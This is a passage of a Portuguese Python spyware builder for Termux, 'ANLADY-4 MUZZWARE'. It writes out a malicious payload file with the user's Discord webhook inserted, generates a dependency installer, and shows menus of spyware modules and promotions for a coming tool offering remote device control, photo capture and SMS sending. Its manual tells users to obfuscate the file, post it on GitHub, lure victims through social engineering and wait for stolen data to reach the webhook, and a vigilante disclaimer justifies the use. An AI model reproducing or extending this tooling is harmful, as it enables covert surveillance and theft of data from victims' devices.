AGORA VOCE COLOCAR O CRITPGRAFADOR E COLOCA O NOME DO ARQUIVO MALICIOSO EXEMPLO SYS.py
OBS: SE ELE PEDIR UMA CHAVA VOCE COLOCA N
SERA ASSIM:

NOME DO ARQUIVO:sys.py
ADICIONA CHAVE: N
NOME DO NOVO ARQUIVO:sys.py

PASSO 4:
[APAGUE O CRIPTOGRAFADOR]
APAGUE COM rm [nome do arquivo]


passo 5:
[COLOQUE NO GITHUB]
AGORA COLOQUE NO GITHUB E ESPERE MANDAR PRO WEBHOOK 



DICAS:
1:USE EM UM CANAL PRIVADO OU UM SERVIDOR FANTASMA
2: UTILIZE UMA FERRAMENTA COMO ENGENHARIA SOCIAL PARA A VITIMAR SENTIR ATRAIDA 
3:NUNCA TESTE NO SEU PROPRIO DISPOSITIVO



OBSERVAÇAO:
[ESSA FERRAMENTA FOI FEITA POR COTIZEIRA E MASTER PARA USO CONTRA PEDOFILOS E PANALEIROS,QUALQUER USO QUE NAO SEJA PRA ISSO NAO NOS RESPONSABILIZAMOS USE COLOCANDO SUA CONTA EM RISCO ATE POR QUE ISSO E CRIME, USE COM RESPONSABILIDADE ASS:COTIZEIRA]




CREDITOS:
COTIZEIRA
MASTER 

SERVIDORES DONOS:
CARNIÇALTEAM


[ALGUMA DUVIDA FALE COM O COTIZEIRA OU O MASTER]
'''
    while True:
        nome_arv = input("NOME DO ARQUIVO COLOQUE POR EXEMPLO [ARQUIVO..py]: ").strip()
        print(nome_arv)
        confirmar = input("DIGITE 'CONFIRMAR' PARA CONFIRMAR O ARQUIVO: ")
        if confirmar == "CONFIRMAR":
            limpar()
            break
        else:
            limpar()
        if not '.py ' in nome_arv:
            nome_arv = f"{nome_arv}.py"
    manual = f'{nome_arv}manual.txt'
    webhoonk = input(f"{azul}WEBHOONK: {amarelo}")
    print(f"{reset} {verde}ok{reset}")
    codigo_malicioso = codigo_malicioso.replace('webhook_url = ""', f'webhook_url = "{webhoonk}"')
    with open(f"{nome_arv}", "w", encoding="utf-8") as arv:
        arv.write(codigo_malicioso)
    with open(f"{manual}", "w", encoding="utf-8") as man:
        man.write(manual_uso)
        print(F"{verde}OK!!!{reset}")
        input("PRESSIONE ENTER PARA CONTINUAR")
        limpar()



def instalador_dependencias():
    instalador_dependencia = r'''import os
import sys
import time
import shutil
import subprocess

NOME_FERRAMENTA = ""
NOME_FERRAMENTA_ESSA = ""

PKG_PACOTES = [
    "python",
    "termux-api",
    "openssl",
    "libffi"
]

PIP_PACOTES = {
    "discord.py": "discord",
    "psutil": "psutil",
    "numpy": "numpy"
}


def executar(comando, tentativas=5):
    for tentativa in range(tentativas):
        try:
            resultado = subprocess.run(
                comando,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=900
            )

            if resultado.returncode == 0:
                return True

        except (
            subprocess.TimeoutExpired,
            subprocess.SubprocessError,
            OSError
        ):
            pass

        if tentativa + 1 < tentativas:
            time.sleep(3)

    return False


def existe(comando):
    return shutil.which(comando) is not None


def verificar_espaco():
    try:
        total, usado, livre = shutil.disk_usage("/")

        minimo = 300 * 1024 * 1024

        return livre >= minimo

    except Exception:
        return True


def verificar_termux():
    if not existe("pkg"):
        return False

    if not existe("python"):
        return False

    return verificar_espaco()


def corrigir_repositorios():
    if executar(["pkg", "update", "-y"], 5):
        return True

    executar(["termux-change-repo"], 1)

    return executar(["pkg", "update", "-y"], 5)


def instalar_pkg():
    for pacote in PKG_PACOTES:
        if executar(
            ["pkg", "install", "-y", pacote],
            5
        ):
            continue

        executar(
            ["pkg", "update", "-y"],
            3
        )

        if not executar(
            ["pkg", "install", "-y", pacote],
            5
        ):
            return False

    return True


def preparar_pip():
    return executar([
        sys.executable,
        "-m",
        "pip",
        "install",
        "--upgrade",
        "pip",
        "setuptools",
        "wheel",
        "--no-cache-dir"
    ], 5)


def instalar_pacote(pacote):
    comandos = [
        [
            sys.executable,
            "-m",
            "pip",
            "install",
            "--upgrade",
            "--no-cache-dir",
            "--prefer-binary",
            pacote
        ],
        [
            sys.executable,
            "-m",
            "pip",
            "install",
            "--upgrade",
            "--no-cache-dir",
            pacote
        ]
    ]

    for comando in comandos:
        if executar(comando, 5):
            return True

    return False


def instalar_pip():
    for pacote in PIP_PACOTES:
        if not instalar_pacote(pacote):
            return False

    return True


def importar(modulo):
    try:
        resultado = subprocess.run(
            [
                sys.executable,
                "-c",
                f"import {modulo}"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=60
        )

        return resultado.returncode == 0

    except Exception:
        return False


def verificar_modulos():
    for modulo in PIP_PACOTES.values():
        if not importar(modulo):
            return False

    return True


def reparar_modulos():
    for pacote, modulo in PIP_PACOTES.items():
        if importar(modulo):
            continue

        if not instalar_pacote(pacote):
            return False

        if not importar(modulo):
            return False

    return True


def verificar_dependencias():
    if not verificar_modulos():
        return False

    try:
        resultado = subprocess.run(
            [
                sys.executable,
                "-m",
                "pip",
                "check"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=120
        )

        return resultado.returncode == 0

    except Exception:
        return False


def configurar_storage():
    comando = shutil.which("termux-setup-storage")

    if not comando:
        return True

    try:
        subprocess.run(
            [comando],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=60
        )
    except Exception:
        pass

    return True


def mover_ferramenta():
    if not NOME_FERRAMENTA:
        return True

    if not NOME_FERRAMENTA_ESSA:
        return True

    origem = os.path.expanduser(NOME_FERRAMENTA)
    destino = os.path.expanduser(NOME_FERRAMENTA_ESSA)

    if not os.path.exists(origem):
        return False

    try:
        if os.path.exists(destino):
            if os.path.isdir(destino):
                shutil.rmtree(destino)
            else:
                os.remove(destino)

        shutil.move(origem, destino)

        return os.path.exists(destino)

    except Exception:
        return False


def instalar():
    if not verificar_termux():
        return False

    if not corrigir_repositorios():
        return False

    if not instalar_pkg():
        return False

    if not preparar_pip():
        return False

    if not instalar_pip():
        return False

    configurar_storage()

    if not verificar_modulos():
        if not reparar_modulos():
            return False

    if not verificar_dependencias():
        if not instalar_pip():
            return False

        if not reparar_modulos():
            return False

        if not verificar_dependencias():
            return False

    if not mover_ferramenta():
        return False

    return verificar_dependencias()


if __name__ == "__main__":
    instalar()
'''
    nk = "dependencias_instalador.py"
    print(f"OKAY, IREI O INSTALADOR DE DEPENDECIAS COMO {nk}")
    input("APERTE ENTER PARA CRIAR")
    with open(f"{nk}", "w", encoding="utf-8") as f:
        f.write(instalador_dependencia)
        print(f"{verde}PRONTO!{reset}")
        input("APERTE ENTER PARA CONTINUAR")






def criptografador():
    print(f"{verde}INICIANDO{piscando}......{reset}")
    criptografar()

def atualizacoes_e_outros():
    spyware = '''SERA UM SPYWARE MUITO FORTE FEITA PRA TERMUX

COM NOVAS FUNCIONALIDADES CONFIRMADAS

1 MODO CONTROLE
[ AGORA VOCE IRA PODERAR  CONTROLAR 24H O DISPOSITIVO
VOCE PODERAR FAZER TUDO QUE VOCE COLETA +1 VEZ TUDO RAPIDO FACIL E FUNCIONAL]

2: 2 MODOS DE FOTO

3: TROCA FOTO DE FUNDO

4: MANDA SMS


ENTRE OUTROS
-------------------------------------------------------------------------------------------------

O PRIMEIRO SPYWARE REAL FEITO 100% PRA TERMUX DO BRASIL [ EU ACHO]
UMA FERRAMENTA ABUSURDAMENTE PODEROSA DEIXANDO AS OUTRA NO CHINELO

----------------------------------------------
ALEM DE TUDO TODO ESSE CODIGO E GRATUITO E 100% SEGURO PRA VOCE 

SEM BLA BLA BLA, SEM MIMI APENAS VERDADES


NA NOVA ATUALIZAÇAO DESSA FERRAMENTA VIRAR O NOVO SPYWARE'''
    papo = '''BEM, ISSO E UMA MENSAGEM MINHA DO CRIADO LORDE COTIZEIRA

BEM EU QUERIA DIZER QUE EU TO MEIO PARADO NO MUNDO POR QUE UMA CAÇADA TOMOU MUITO MEU TEMPO EOS CARALHO MAIS EU IREI VOLTAR OK? PROVALVELMENTE POSSO KITAR MAIS EM FIM, QUERIA PEDIR PRA VOCES DENUNCIAREM PEDOFILOS OU PANELEIROS OU CRIMINOSO NO MEU SERVIDOR OK? EU GOSTARIA DEMAIS QUANTO MAIS EU VER GENTE QUE ME APOIA EU POSSO CONTINUAR,EU SEI QUE ISSO E ARISCADO E TUDO MAIS POREM SINCERAMENTE EU ME ARISCO EU QUERO CONTINUAR, E PRECISO DE VOCE


E TO PENSANDO EM OCUTAR MEUS CODIGOS NAO DEIXA MAIS PUBLICOS POR QUE MAL INTENCIONADOS PODEM USAR E TALS CONTRA PESSOAS QUE QUEREMOS PROTEGER


E TAMBEM  QUERIA TRAZER UMA CARTA ABERTA AQUI PRA PEDIR QUE VOCE VE COISAS
VOCE VE PESSOAS SENDO ABUSADAS ONLINE DENUNCIE SERIO, ISSO PODE FAZER UMA DIFERENCIA ENORME
EU PREZO PELA SEGURANÇA E BASICAMENTE ISSO

SOBRE O PROXIMO SPYWARE?
ELE VAI LANÇAR EM BREVE
UM ABRAÇO DE SEU REI LORDE COTIZEIRA
'''
    membros = f'''{vermelho}{fundo_preto}MEMBROS DA CARNIÇAL TEAM:
by:

LORDE COTIZEIRA
CARCARA
NICCKY
KARNEL
𓅐HEXBSD𓅐
sn0w
Vtr
rayux  



{reset}'''
    atuli = '''ESSA EA VERSAO BETA 

A VERSAO REAL IRA SAIR JUNTO COM O SPYWARE PROPRIO

'''

    n = F''''MENU:
             1:SPYWARE
             2:MENSAGEM DO LORDE COTIZEIRA
             3: MEMBROS
             4: ATUALIZAÇOES
             5: voltar '''
    l  = input(":")
    if int(l) == 1:
        limpar()
        print(spyware)
    elif int(l) == 2:
        limpar()
        print(papo)
    elif int(l) == 3:
        limpar()
        print(membros)
    elif int(l) == 4:
        limpar()
        print(atuli)
    elif int(l) == 5:
        return
    else:
        print(f"{vermelho}opcao invalida{reset}")
    input("PRESSIONE ENTER PARA CONTINUAR")
    limpar()











def spywares_opc():
    menu_spyware = f"""{fundo_preto}{vermelho}
╭──────────────────────────────────────────────────────────────────────────────╮
│                                                                              │
│   ███████╗██████╗ ██╗   ██╗██╗    ██╗ █████╗ ██████╗ ███████╗                │
│   ██╔════╝██╔══██╗╚██╗ ██╔╝██║    ██║██╔══██╗██╔══██╗██╔════╝                │
│   ███████╗██████╔╝ ╚████╔╝ ██║ █╗ ██║███████║██████╔╝█████╗                  │
│   ╚════██║██╔═══╝   ╚██╔╝  ██║███╗██║██╔══██║██╔══██╗██╔══╝                  │
│   ███████║██║        ██║   ╚███╔███╔╝██║  ██║██║  ██║███████╗                │
│   ╚══════╝╚═╝        ╚═╝    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝                │
│                                                                              │
│                         S P Y W A R E   C O N S O L E                        │
│                                                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─[ MODULES ]──────────────────────────────────────────────────────────┐   │
│   │                                                                      │   │
│   │     [ 01 ]  LM HAT                                                   │   │
│   │                                                                      │   │
│   │     [ 02 ]  JUDAS-MUZZWARES                                          │   │
│   │                                                                      │   │
│   │     [ 03 ]  B.S.T.C                                                  │   │
│   │                                                                      │   │
│   └──────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│                                                                              │
│ {magenta}          𓅐  CRIADO POR LORDE COTIZEIRA  𓅐     {vermelho}                             1│
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯
"""
    print(reset)
    while True:
        limpar()
        print(menu_spyware)
        esc = input(":")
        if int(esc) == 1:
            limpar()
            esc_lm_hay()
            break
        elif int(esc) == 2:
            limpar()
            esc_muzzmalware()
            break
        elif int(esc) == 3:
            limpar()
            esc_bstc()
            break
        elif int(esc) == 0:
            limpar()
            break
        else:
            print(f"{vermelho}opcao invalida CASO QUERIA VOLTAR COLOQUE 0{reset}")
            input("PRESSIONE ENTER PARA CONTINUAR")
            limpar()



def main():
    aviso = '''[AVISO DE ETICA]

LEMBRADO RAPAZIADA USEM COLOCANDO SUA CONTA EM RISCO
O  CRIADOR NAO SE RESPONSABILIZA POR USO INDEVIDO QUALQUER USO E CULPA 100% SUA

SEU TOKEN
SUAS ENGEHARIAS 
SEUS METODOS
SEUS B.O

ELE APENAS CRIOU O CODIGO 
SE O USO FOR USADO IDEVIDAMENTE



[ OUTRA COISA NAO USE CONTRA VITIMAS INOCENTES,POSSO PASSAR PANO SE FOR USADOS CONTRA PANELEIROS, E PEDOFILOS]
NAO ESTOU BRINCADO ISSO E SERIO!!!


NAO SAIA INVADIDO DISPOSITIVOS ALHEIOS ATE POR QUE ISSO E CRIME'''
    menun = f"""{fundo_preto}{vermelho}
╭──────────────────────────────────────────────────────────────────────────────╮
│                                                                              │
│                  A N L A D Y - 4 M U Z Z W A R E                             │
│                         A U T O M A T I C                                    │
│                                                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─[ MENU PRINCIPAL ]───────────────────────────────────────────────────┐   │
│   │                                                                      │   │
│   │      [ 01 ]   CÓDIGOS                                                │   │
│   │                                                                      │   │
│   │      [ 02 ]   CRIPTOGRAFADOR                                         │   │
│   │                                                                      │   │
│   │      [ 03 ]   AUTOMATIZADOR                                          │   │
│   │                                                                      │   │
│   │      [ 04 ]   ATUALIZAÇÕES E OUTROS                                  │   │
│   │                                                                      │   │
│   │      [ 05 ]   AVISO DE ÉTICA                                         │   │
│   │                                                                      │   │
│   │      [ 06 ]   SAIR                                                   │   │
│   │                                                                      │   │
│   └──────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                  [ EXCLUSIVO DA CARNIÇAL TEAM ]                              │
│                                                                              │
│             {magenta} 𓅐  CRIADO POR LORDE COTIZEIRA  𓅐{vermelho}                               │
│                                                                              │
╰──────────────────────────────────────────────────────────────────────────────╯
{reset}"""
    while True:
        print(menun)
        esc = input(f": ")
        if int(esc) == 1:
            limpar()
            spywares_opc()
        elif int(esc) == 2:
            limpar()
            criptografador()
        elif int(esc) == 3:
            limpar()
            instalador_dependencias()
        elif int(esc) == 4:
            limpar()
            atualizacoes_e_outros()
        elif int(esc) == 5:
            limpar()
            print(aviso)
            input("PRESSIONE ENTER PARA CONTINUAR")
            limpar()
        elif int(esc) == 6:
            return







if __name__ == "__main__":
    main() 
